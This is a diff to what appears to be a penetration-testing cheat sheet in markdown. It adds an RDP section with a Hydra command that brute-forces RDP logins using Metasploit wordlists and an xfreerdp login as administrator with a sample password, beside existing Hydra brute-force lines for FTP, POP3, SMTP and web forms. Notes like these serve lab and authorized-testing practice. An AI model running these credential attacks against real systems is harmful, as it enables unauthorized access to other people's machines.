@@ -19,6 +19,7 @@
 - [Brute-force attack](#bruteforce)
 - [Password Cracking](#cracking)
 - [Simple Local Web Servers](#Localweb)
+- [RDP -3389](#RDP)
 
 
 # Enumeration
@@ -202,6 +203,10 @@ hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp
 ```
 hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3
 ```
+### Hydra RDP
+```
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>
+```
 ### Hydra SMTP Brute Force
 ```
 hydra -P /usr/share/wordlists/rockyou.txt 127.0.0.1 smtp -V
@@ -218,8 +223,11 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/D
 ```
 
 
+- ## RDP - 3389 <a name="RDP"></a>
 
-
+```
+xfreerdp /u:administrator /p:qwertyuiop /v:<target> ip:<port_number>
+```
 
 - ## Password Cracking <a name="cracking"></a>
 ### John The Ripper
